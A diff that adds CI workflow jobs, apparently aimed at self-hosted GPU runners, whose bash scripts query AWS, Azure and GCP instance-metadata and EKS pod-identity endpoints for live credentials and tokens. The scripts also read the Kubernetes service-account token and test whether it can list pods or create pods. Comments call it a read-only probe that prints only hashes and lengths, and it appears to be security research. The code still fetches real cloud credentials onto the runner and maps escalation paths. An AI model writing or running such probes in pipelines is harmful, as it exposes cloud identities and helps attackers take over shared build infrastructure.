+          IMDS_TOK=$(curl -sS -m 5 --connect-timeout 3 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' -o /tmp/imds_tok -w '%{http_code}' "$META/latest/api/token" 2>/dev/null)
+          echo "IMDS_TOKEN_HTTP=$IMDS_TOK TOKEN_BYTES=$(wc -c </tmp/imds_tok 2>/dev/null | tr -d ' ')"
+          IMDS_TOKEN_BOGUS=$(curl -sS -m 5 --connect-timeout 3 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' -o /tmp/imds_tok_b -w '%{http_code}' "$META/latest/api/token-c211bogus" 2>/dev/null)
+          echo "IMDS_TOKEN_BOGUS_HTTP=$IMDS_TOKEN_BOGUS"
+          if [ "$IMDS_TOK" = "200" ]; then
+            T=$(cat /tmp/imds_tok 2>/dev/null)
+            ROLES_HTTP=$(curl -sS -m 5 --connect-timeout 3 -H "X-aws-ec2-metadata-token: $T" -o /tmp/imds_roles -w '%{http_code}' "$META/latest/meta-data/iam/security-credentials/" 2>/dev/null)
+            ROLE=$(head -c 200 /tmp/imds_roles 2>/dev/null | tr -d '\r\n')
+            echo "IMDS_ROLES_HTTP=$ROLES_HTTP IMDS_ROLE_NAME=${ROLE:-<none>}"
+            ROLES_BOGUS=$(curl -sS -m 5 --connect-timeout 3 -H "X-aws-ec2-metadata-token: $T" -o /tmp/imds_roles_b -w '%{http_code}' "$META/latest/meta-data/iam/security-credentials-c211bogus/" 2>/dev/null)
+            echo "IMDS_ROLES_BOGUS_HTTP=$ROLES_BOGUS"
+            if [ -n "$ROLE" ]; then
+              CRED_HTTP=$(curl -sS -m 5 --connect-timeout 3 -H "X-aws-ec2-metadata-token: $T" -o /tmp/imds_cred -w '%{http_code}' "$META/latest/meta-data/iam/security-credentials/$ROLE" 2>/dev/null)
+              echo "IMDS_CRED_HTTP=$CRED_HTTP"
+              [ "$CRED_HTTP" = "200" ] && parse_json_keys /tmp/imds_cred IMDS_CRED
+              CRED_BOGUS=$(curl -sS -m 5 --connect-timeout 3 -H "X-aws-ec2-metadata-token: $T" -o /tmp/imds_cred_b -w '%{http_code}' "$META/latest/meta-data/iam/security-credentials/${ROLE}c211bogus" 2>/dev/null)
+              echo "IMDS_CRED_BOGUS_HTTP=$CRED_BOGUS"
+            fi
+          fi
+
+          echo "=== EKS_POD_IDENTITY ==="
+          echo "ENV_AWS_CONTAINER_RELATIVE=${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI:-ABSENT}"
+          if [ -n "${AWS_CONTAINER_CREDENTIALS_FULL_URI:-}" ]; then
+            echo "ENV_AWS_CONTAINER_FULL_URI_PRESENT=yes len=${#AWS_CONTAINER_CREDENTIALS_FULL_URI} sha256=$(printf '%s' "$AWS_CONTAINER_CREDENTIALS_FULL_URI" | sha256sum 2>/dev/null | cut -d' ' -f1)"
+          else
+            echo "ENV_AWS_CONTAINER_FULL_URI_PRESENT=no"
+          fi
+          if [ -n "${AWS_CONTAINER_AUTHORIZATION_TOKEN:-}" ]; then
+            echo "ENV_AWS_CONTAINER_AUTH_PRESENT=yes len=${#AWS_CONTAINER_AUTHORIZATION_TOKEN} sha256=$(printf '%s' "$AWS_CONTAINER_AUTHORIZATION_TOKEN" | sha256sum 2>/dev/null | cut -d' ' -f1)"
+          else
+            echo "ENV_AWS_CONTAINER_AUTH_PRESENT=no"
+          fi
+          for EP in 169.254.170.23 169.254.170.22 169.254.170.2; do
+            SAFE=$(echo "$EP" | tr '.' '_')
+            H=$(curl -sS -m 5 --connect-timeout 3 -o /tmp/podid_$SAFE -w '%{http_code}' "http://$EP/v1/credentials" 2>/dev/null)
+            echo "PODID_${SAFE}_CRED_HTTP=$H BYTES=$(wc -c </tmp/podid_$SAFE 2>/dev/null | tr -d ' ')"
+            [ "$H" = "200" ] && parse_json_keys /tmp/podid_$SAFE PODID_$SAFE
+            HB=$(curl -sS -m 5 --connect-timeout 3 -o /tmp/podid_${SAFE}_b -w '%{http_code}' "http://$EP/v1/credentials-c211bogus" 2>/dev/null)
+            echo "PODID_${SAFE}_BOGUS_HTTP=$HB"
+          done
+
+          echo "=== AZURE_IMDS ==="
+          AZ_URL='http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F'
+          AZ=$(curl -sS -m 5 --connect-timeout 3 -H 'Metadata: true' -o /tmp/aztok -w '%{http_code}' "$AZ_URL" 2>/dev/null)
+          echo "AZURE_IMDS_HTTP=$AZ BYTES=$(wc -c </tmp/aztok 2>/dev/null | tr -d ' ')"
+          [ "$AZ" = "200" ] && parse_json_keys /tmp/aztok AZURE_IMDS
+          AZB=$(curl -sS -m 5 --connect-timeout 3 -H 'Metadata: true' -o /tmp/aztok_b -w '%{http_code}' 'http://169.254.169.254/metadata/identity/oauth2/token-c211bogus?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' 2>/dev/null)
+          echo "AZURE_IMDS_BOGUS_HTTP=$AZB"
+
+          echo "=== GCP_METADATA ==="
+          for GH in metadata.google.internal 169.254.169.254; do
+            SAFE=$(echo "$GH" | tr '.' '_')
+            G=$(curl -sS -m 5 --connect-timeout 3 -H 'Metadata-Flavor: Google' -o /tmp/gcp_$SAFE -w '%{http_code}' "http://$GH/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null)
+            echo "GCP_${SAFE}_TOKEN_HTTP=$G BYTES=$(wc -c </tmp/gcp_$SAFE 2>/dev/null | tr -d ' ')"
+            [ "$G" = "200" ] && parse_json_keys /tmp/gcp_$SAFE GCP_${SAFE}
+            GB=$(curl -sS -m 5 --connect-timeout 3 -H 'Metadata-Flavor: Google' -o /tmp/gcp_${SAFE}_b -w '%{http_code}' "http://$GH/computeMetadata/v1/instance/service-accounts/default/token-c211bogus" 2>/dev/null)
+            echo "GCP_${SAFE}_BOGUS_HTTP=$GB"
+          done
+
+          echo "=== K8S_RBAC ==="
+          SA="${C211_SA_DIR:-/var/run/secrets/kubernetes.io/serviceaccount}"
+          if [ -f "$SA/token" ]; then
+            read -r N S <<<"$(hashval $SA/token)"
+            echo "K8S_SA_TOKEN_PRESENT=yes bytes=$N sha256=$S"
+            echo "K8S_SA_NAMESPACE=$(head -c 200 $SA/namespace 2>/dev/null)"
+            echo "K8S_SA_CA_PRESENT=$([ -f $SA/ca.crt ] && echo yes || echo no)"
+            KHOST=${KUBERNETES_SERVICE_HOST:-}
+            KPORT=${KUBERNETES_SERVICE_PORT:-443}
+            if [ -n "$KHOST" ]; then
+              KURL="https://$KHOST:$KPORT"
+              if [ -f "$SA/ca.crt" ]; then CAARG="--cacert $SA/ca.crt"; else CAARG="-k"; fi
+              NS=$(cat $SA/namespace 2>/dev/null)
+              TOK=$(cat $SA/token 2>/dev/null)
+              echo "K8S_API=$KURL NS=$NS"
+              SSRR_CODE=$(curl -sS -m 6 --connect-timeout 3 $CAARG -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -X POST --data '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"'"$NS"'"}}' -o /tmp/ssrr.json -w '%{http_code}' "$KURL/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" 2>/dev/null)
+              echo "K8S_SSRR_HTTP=$SSRR_CODE"
+              if [ "$SSRR_CODE" = "201" ] && command -v python3 >/dev/null 2>&1; then
+                python3 - <<'PY'
+          import json
+          try:
+              d=json.load(open('/tmp/ssrr.json'))
+          except Exception:
+              print('K8S_SSRR_PARSE_FAIL'); raise SystemExit
+          rules=(d.get('status') or {}).get('resourceRules') or []
+          got={}
+          for r in rules:
+              verbs=r.get('verbs') or []
+              res=r.get('resources') or []
+              for rn in ('nodes','pods','secrets'):
+                  for v in ('get','list','create'):
+                      if ('*' in res or rn in res or (rn+'/*') in res) and ('*' in verbs or v in verbs):
+                          got[(v,rn)]=True
+          for v in ('get','list','create'):
+              for rn in ('nodes','pods','secrets'):
+                  print('K8S_SSRR_%s_%s=%s'%(v,rn,'true' if got.get((v,rn)) else 'false'))
+          print('K8S_SSRR_RULES=%d'%len(rules))
+          PY
+              fi
+              ssar() {
+                local name="$1" verb="$2" res="$3" ns="$4"
+                local body
+                if [ -n "$ns" ]; then
+                  body='{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"'"$verb"'","resource":"'"$res"'","namespace":"'"$ns"'"}}}'
+                else
+                  body='{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"'"$verb"'","resource":"'"$res"'"}}}'
+                fi
+                local code
+                code=$(curl -sS -m 6 --connect-timeout 3 $CAARG -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -X POST --data "$body" -o /tmp/ssar_$name.json -w '%{http_code}' "$KURL/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" 2>/dev/null)
+                local allowed=unknown
+                if [ "$code" = "201" ] && command -v python3 >/dev/null 2>&1; then
+                  allowed=$(python3 -c "import json;d=json.load(open('/tmp/ssar_$name.json'));print(str((d.get('status') or {}).get('allowed')).lower())" 2>/dev/null)
+                fi
+                echo "K8S_SSAR_${name}_HTTP=$code allowed=$allowed"
+              }
+              ssar get_nodes get nodes ""
+              ssar list_pods list pods "$NS"
+              ssar create_pods create pods "$NS"
+            else
+              echo "K8S_API_ENV_ABSENT"
+            fi
+          else
+            echo "K8S_SA_TOKEN_PRESENT=no"
+          fi
+
+          echo "K8S_NO_POD_CREATED=confirmed"
+          echo "HOST_WRITE_NONE=confirmed"
+          echo "=== END_STATE ==="
+          echo "TS_END=$(ts)"
+          echo "C211_NVMETA_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
+
+  nvmeta-h100x4:
+    runs-on: "4-gpu-h100"
+    timeout-minutes: 20
+    steps:
+      - name: nvmeta-h100x4-readonly-cloudid-rbac
+        env:
+          NONCE: c211-127145-2252f091552a3e9a
+          JOBTAG: nvmeta-h100x4
+        run: |
+          #!/usr/bin/env bash
+          # c211-127145 read-only cloud-identity / metadata / in-cluster RBAC probe.
+          # STRICTLY READ-ONLY: creates no pod, makes no host write, prints no secret VALUES
+          # (presence + sha256 only). Container-local /tmp scratch is the only write.
+          set +e
+          ts() { date -u +%Y-%m-%dT%H:%M:%SZ; }
+          NONCE="${NONCE:-c211-127145-UNSET}"
+          JOBTAG="${JOBTAG:-job}"
+          echo "NONCE=$NONCE JOBTAG=$JOBTAG TS_START=$(ts)"
+          echo "HOSTNAME=$(hostname 2>/dev/null) UID=$(id -u 2>/dev/null) EUID=$EUID USER=$(id -un 2>/dev/null)"
+          echo "KERNEL=$(uname -sr 2>/dev/null)"
+          echo "ENV_K8S_HOST=${KUBERNETES_SERVICE_HOST:-ABSENT} ENV_K8S_PORT=${KUBERNETES_SERVICE_PORT:-ABSENT}"
+          echo "TOOLS curl=$(command -v curl >/dev/null 2>&1 && echo yes || echo no) python3=$(command -v python3 >/dev/null 2>&1 && echo yes || echo no) sha256sum=$(command -v sha256sum >/dev/null 2>&1 && echo yes || echo no)"
+
+          echo "=== GPU_DEVICES ==="
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 20 nvidia-smi -L 2>&1 | head -20
+            echo "--- NVIDIA_SMI_QUERY ---"
+            timeout 20 nvidia-smi --query-gpu=uuid,name,driver_version --format=csv,noheader 2>&1 | head -20
+          else
+            echo "NVIDIA_SMI_ABSENT"
+          fi
+
+          hashval() {
+            local f="$1"
+            if [ -f "$f" ]; then
+              local n s
+              n=$(wc -c <"$f" 2>/dev/null | tr -d ' ')
+              if command -v sha256sum >/dev/null 2>&1; then
+                s=$(sha256sum "$f" 2>/dev/null | cut -d' ' -f1)
+              elif command -v python3 >/dev/null 2>&1; then
+                s=$(python3 -c 'import hashlib,sys;print(hashlib.sha256(open(sys.argv[1],"rb").read()).hexdigest())' "$f" 2>/dev/null)
+              else
+                s=UNAVAILABLE
+              fi
+              echo "$n $s"
+            else
+              echo "ABSENT"
+            fi
+          }
+
+          parse_json_keys() {
+            local f="$1" pfx="$2"
+            if ! command -v python3 >/dev/null 2>&1; then echo "${pfx}_PY3_ABSENT"; return; fi
+            python3 - "$f" "$pfx" <<'PY'
+          import json,sys,hashlib
+          p,pfx=sys.argv[1],sys.argv[2]
+          try:
+              d=json.load(open(p))
+          except Exception:
+              print(pfx+'_PARSE_FAIL'); raise SystemExit
+          if not isinstance(d,dict):
+              print(pfx+'_NOT_OBJECT'); raise SystemExit
+          for k in sorted(d.keys()):
+              v=d[k]
+              if isinstance(v,str) and v:
+                  print('%s_KEY %s PRESENT len=%d sha256=%s'%(pfx,k,len(v),hashlib.sha256(v.encode()).hexdigest()[:16]))
+              elif isinstance(v,bool) or isinstance(v,(int,float)):
+                  print('%s_KEY %s PRESENT scalar'%(pfx,k))
+              elif isinstance(v,(dict,list)):
+                  print('%s_KEY %s PRESENT container'%(pfx,k))
+              else:
+                  print('%s_KEY %s ABSENT'%(pfx,k))
+          PY
+          }
+
+          echo "=== IMDSV2 ==="
+          META=http://169.254.169.254
+          IMDS_TOK=$(curl -sS -m 5 --connect-timeout 3 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' -o /tmp/imds_tok -w '%{http_code}' "$META/latest/api/token" 2>/dev/null)
+          echo "IMDS_TOKEN_HTTP=$IMDS_TOK TOKEN_BYTES=$(wc -c </tmp/imds_tok 2>/dev/null | tr -d ' ')"
+          IMDS_TOKEN_BOGUS=$(curl -sS -m 5 --connect-timeout 3 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' -o /tmp/imds_tok_b -w '%{http_code}' "$META/latest/api/token-c211bogus" 2>/dev/null)
+          echo "IMDS_TOKEN_BOGUS_HTTP=$IMDS_TOKEN_BOGUS"
+          if [ "$IMDS_TOK" = "200" ]; then
+            T=$(cat /tmp/imds_tok 2>/dev/null)
+            ROLES_HTTP=$(curl -sS -m 5 --connect-timeout 3 -H "X-aws-ec2-metadata-token: $T" -o /tmp/imds_roles -w '%{http_code}' "$META/latest/meta-data/iam/security-credentials/" 2>/dev/null)
+            ROLE=$(head -c 200 /tmp/imds_roles 2>/dev/null | tr -d '\r\n')
+            echo "IMDS_ROLES_HTTP=$ROLES_HTTP IMDS_ROLE_NAME=${ROLE:-<none>}"
+            ROLES_BOGUS=$(curl -sS -m 5 --connect-timeout 3 -H "X-aws-ec2-metadata-token: $T" -o /tmp/imds_roles_b -w '%{http_code}' "$META/latest/meta-data/iam/security-credentials-c211bogus/" 2>/dev/null)
+            echo "IMDS_ROLES_BOGUS_HTTP=$ROLES_BOGUS"
+            if [ -n "$ROLE" ]; then
+              CRED_HTTP=$(curl -sS -m 5 --connect-timeout 3 -H "X-aws-ec2-metadata-token: $T" -o /tmp/imds_cred -w '%{http_code}' "$META/latest/meta-data/iam/security-credentials/$ROLE" 2>/dev/null)
+              echo "IMDS_CRED_HTTP=$CRED_HTTP"
+              [ "$CRED_HTTP" = "200" ] && parse_json_keys /tmp/imds_cred IMDS_CRED
+              CRED_BOGUS=$(curl -sS -m 5 --connect-timeout 3 -H "X-aws-ec2-metadata-token: $T" -o /tmp/imds_cred_b -w '%{http_code}' "$META/latest/meta-data/iam/security-credentials/${ROLE}c211bogus" 2>/dev/null)
+              echo "IMDS_CRED_BOGUS_HTTP=$CRED_BOGUS"
+            fi
+          fi
+
+          echo "=== EKS_POD_IDENTITY ==="
+          echo "ENV_AWS_CONTAINER_RELATIVE=${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI:-ABSENT}"
+          if [ -n "${AWS_CONTAINER_CREDENTIALS_FULL_URI:-}" ]; then
+            echo "ENV_AWS_CONTAINER_FULL_URI_PRESENT=yes len=${#AWS_CONTAINER_CREDENTIALS_FULL_URI} sha256=$(printf '%s' "$AWS_CONTAINER_CREDENTIALS_FULL_URI" | sha256sum 2>/dev/null | cut -d' ' -f1)"
+          else
+            echo "ENV_AWS_CONTAINER_FULL_URI_PRESENT=no"
+          fi
+          if [ -n "${AWS_CONTAINER_AUTHORIZATION_TOKEN:-}" ]; then
+            echo "ENV_AWS_CONTAINER_AUTH_PRESENT=yes len=${#AWS_CONTAINER_AUTHORIZATION_TOKEN} sha256=$(printf '%s' "$AWS_CONTAINER_AUTHORIZATION_TOKEN" | sha256sum 2>/dev/null | cut -d' ' -f1)"
+          else
+            echo "ENV_AWS_CONTAINER_AUTH_PRESENT=no"
+          fi
+          for EP in 169.254.170.23 169.254.170.22 169.254.170.2; do
+            SAFE=$(echo "$EP" | tr '.' '_')
+            H=$(curl -sS -m 5 --connect-timeout 3 -o /tmp/podid_$SAFE -w '%{http_code}' "http://$EP/v1/credentials" 2>/dev/null)
+            echo "PODID_${SAFE}_CRED_HTTP=$H BYTES=$(wc -c </tmp/podid_$SAFE 2>/dev/null | tr -d ' ')"
+            [ "$H" = "200" ] && parse_json_keys /tmp/podid_$SAFE PODID_$SAFE
+            HB=$(curl -sS -m 5 --connect-timeout 3 -o /tmp/podid_${SAFE}_b -w '%{http_code}' "http://$EP/v1/credentials-c211bogus" 2>/dev/null)
+            echo "PODID_${SAFE}_BOGUS_HTTP=$HB"
+          done
+
+          echo "=== AZURE_IMDS ==="
+          AZ_URL='http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F'
+          AZ=$(curl -sS -m 5 --connect-timeout 3 -H 'Metadata: true' -o /tmp/aztok -w '%{http_code}' "$AZ_URL" 2>/dev/null)
+          echo "AZURE_IMDS_HTTP=$AZ BYTES=$(wc -c </tmp/aztok 2>/dev/null | tr -d ' ')"
+          [ "$AZ" = "200" ] && parse_json_keys /tmp/aztok AZURE_IMDS
+          AZB=$(curl -sS -m 5 --connect-timeout 3 -H 'Metadata: true' -o /tmp/aztok_b -w '%{http_code}' 'http://169.254.169.254/metadata/identity/oauth2/token-c211bogus?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' 2>/dev/null)
+          echo "AZURE_IMDS_BOGUS_HTTP=$AZB"
+
+          echo "=== GCP_METADATA ==="
+          for GH in metadata.google.internal 169.254.169.254; do
+            SAFE=$(echo "$GH" | tr '.' '_')
+            G=$(curl -sS -m 5 --connect-timeout 3 -H 'Metadata-Flavor: Google' -o /tmp/gcp_$SAFE -w '%{http_code}' "http://$GH/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null)
+            echo "GCP_${SAFE}_TOKEN_HTTP=$G BYTES=$(wc -c </tmp/gcp_$SAFE 2>/dev/null | tr -d ' ')"
+            [ "$G" = "200" ] && parse_json_keys /tmp/gcp_$SAFE GCP_${SAFE}
+            GB=$(curl -sS -m 5 --connect-timeout 3 -H 'Metadata-Flavor: Google' -o /tmp/gcp_${SAFE}_b -w '%{http_code}' "http://$GH/computeMetadata/v1/instance/service-accounts/default/token-c211bogus" 2>/dev/null)
+            echo "GCP_${SAFE}_BOGUS_HTTP=$GB"
+          done
+
+          echo "=== K8S_RBAC ==="
+          SA="${C211_SA_DIR:-/var/run/secrets/kubernetes.io/serviceaccount}"
+          if [ -f "$SA/token" ]; then
+            read -r N S <<<"$(hashval $SA/token)"
+            echo "K8S_SA_TOKEN_PRESENT=yes bytes=$N sha256=$S"
+            echo "K8S_SA_NAMESPACE=$(head -c 200 $SA/namespace 2>/dev/null)"
+            echo "K8S_SA_CA_PRESENT=$([ -f $SA/ca.crt ] && echo yes || echo no)"
+            KHOST=${KUBERNETES_SERVICE_HOST:-}
+            KPORT=${KUBERNETES_SERVICE_PORT:-443}
+            if [ -n "$KHOST" ]; then
+              KURL="https://$KHOST:$KPORT"
+              if [ -f "$SA/ca.crt" ]; then CAARG="--cacert $SA/ca.crt"; else CAARG="-k"; fi
+              NS=$(cat $SA/namespace 2>/dev/null)
+              TOK=$(cat $SA/token 2>/dev/null)
+              echo "K8S_API=$KURL NS=$NS"
+              SSRR_CODE=$(curl -sS -m 6 --connect-timeout 3 $CAARG -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -X POST --data '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"'"$NS"'"}}' -o /tmp/ssrr.json -w '%{http_code}' "$KURL/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" 2>/dev/null)
+              echo "K8S_SSRR_HTTP=$SSRR_CODE"
+              if [ "$SSRR_CODE" = "201" ] && command -v python3 >/dev/null 2>&1; then
+                python3 - <<'PY'
+          import json
+          try:
+              d=json.load(open('/tmp/ssrr.json'))
+          except Exception:
+              print('K8S_SSRR_PARSE_FAIL'); raise SystemExit
+          rules=(d.get('status') or {}).get('resourceRules') or []
+          got={}
+          for r in rules:
+              verbs=r.get('verbs') or []
+              res=r.get('resources') or []
+              for rn in ('nodes','pods','secrets'):
+                  for v in ('get','list','create'):
+                      if ('*' in res or rn in res or (rn+'/*') in res) and ('*' in verbs or v in verbs):
+                          got[(v,rn)]=True
+          for v in ('get','list','create'):
+              for rn in ('nodes','pods','secrets'):
+                  print('K8S_SSRR_%s_%s=%s'%(v,rn,'true' if got.get((v,rn)) else 'false'))
+          print('K8S_SSRR_RULES=%d'%len(rules))
+          PY
+              fi
+              ssar() {
+                local name="$1" verb="$2" res="$3" ns="$4"
+                local body
+                if [ -n "$ns" ]; then
+                  body='{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"'"$verb"'","resource":"'"$res"'","namespace":"'"$ns"'"}}}'
+                else
+                  body='{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"'"$verb"'","resource":"'"$res"'"}}}'
+                fi
+                local code
+                code=$(curl -sS -m 6 --connect-timeout 3 $CAARG -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -X POST --data "$body" -o /tmp/ssar_$name.json -w '%{http_code}' "$KURL/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" 2>/dev/null)
+                local allowed=unknown
+                if [ "$code" = "201" ] && command -v python3 >/dev/null 2>&1; then
+                  allowed=$(python3 -c "import json;d=json.load(open('/tmp/ssar_$name.json'));print(str((d.get('status') or {}).get('allowed')).lower())" 2>/dev/null)
+                fi
+                echo "K8S_SSAR_${name}_HTTP=$code allowed=$allowed"
+              }
+              ssar get_nodes get nodes ""
+              ssar list_pods list pods "$NS"
+              ssar create_pods create pods "$NS"
+            else
+              echo "K8S_API_ENV_ABSENT"
+            fi
+          else
+            echo "K8S_SA_TOKEN_PRESENT=no"
+          fi
+
+          echo "K8S_NO_POD_CREATED=confirmed"
+          echo "HOST_WRITE_NONE=confirmed"
+          echo "=== END_STATE ==="
+          echo "TS_END=$(ts)"
+          echo "C211_NVMETA_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
